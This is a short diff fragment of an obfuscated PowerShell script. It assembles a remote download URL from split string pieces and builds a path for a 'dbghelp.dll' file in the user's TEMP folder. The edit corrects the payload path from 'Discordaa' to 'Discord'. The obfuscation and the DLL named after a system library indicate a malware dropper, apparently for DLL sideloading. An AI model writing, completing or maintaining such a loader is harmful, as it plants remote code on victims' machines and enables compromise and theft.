@@ -6,7 +6,7 @@ $_0x91A = @(
     ".com/Flexnajaaa123",
     "/aaaa/refs",
     "/heads/main/",
-    "Discordaa"
+    "Discord"
 ) -join ""
 
 $_0xB2F = Join-Path $env:TEMP (@("dbg","help",".dll") -join "")
